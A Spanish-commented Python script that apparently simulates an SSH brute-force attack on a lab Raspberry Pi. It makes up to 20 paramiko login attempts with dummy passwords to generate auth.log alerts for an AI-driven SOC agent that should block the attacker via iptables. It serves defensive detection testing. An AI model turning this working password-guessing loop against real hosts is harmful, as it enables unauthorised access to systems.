import paramiko
import sys
import time
import socket

def ataque_fuerza_bruta(ip_objetivo, usuario="pi", max_intentos=20):
    print(f"🔥 [ATACANTE] Comenzando ataque SSH de Fuerza Bruta contra {ip_objetivo}")
    print(f"[*] El objetivo de este script es llenar el /var/log/auth.log de la víctima de errores reales.")
    print("-" * 50)
    
    for i in range(max_intentos):
        password_falsa = f"admin{i}123!"
        print(f"[{i+1}/{max_intentos}] Intentando login -> {usuario}:{password_falsa}")
        
        # Inicializar el cliente SSH
        ssh = paramiko.SSHClient()
        # Aceptar claves no conocidas automáticamente
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            # Timeout corto (3 segs): Si el SOC bloquea nuestra IP, el connect dará TimeoutError rápido
            ssh.connect(ip_objetivo, username=usuario, password=password_falsa, timeout=3)
            print("  [!] Error: Contraseña correcta (Inesperado en prueba de fuerza bruta)")
            ssh.close()
            break
            
        except paramiko.AuthenticationException:
            # Esto es lo normal. Contraseña incorrecta, SSH rechaza, se guarda un log en Pi 4.
            print("  [✓] Respuesta del servidor: Acceso Denegado (Generando registro de alerta en víctima...)")
            
        except (TimeoutError, socket.timeout):
            print("\n🚨 [BLOQUEADO] ¡TIMEOUT DE CONEXIÓN!")
            print("🚨 Parece que el Agente SOC de la Pi 5 ordenó a la Pi 4 banearnos mediante iptables.")
            print("🚨 Ataque neutralizado y rechazado a nivel de red.")
            break
            
        except Exception as e:
            if "timeout" in str(e).lower():
                print("\n🚨 [BLOQUEADO] Timeout. ¡El SOC nos ha bloqueado (DROP)!")
                break
            else:
                print(f"  [!] Error desconocido: {e}")
                
        # Un pequeño delay de 1 segundo para que la IA tenga tiempo a procesar en paralelo y no colapsar la red
        time.sleep(1) 
        
    print("-" * 50)
    print("🏁 [ATACANTE] Finalizando simulación.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("💡 Uso: python simulador_ataque.py <IP_RASPBERRY_PI_4>")
        print("   Ejemplo: python simulador_ataque.py 192.168.1.100")
        sys.exit(1)
        
    ip = sys.argv[1]
    ataque_fuerza_bruta(ip)
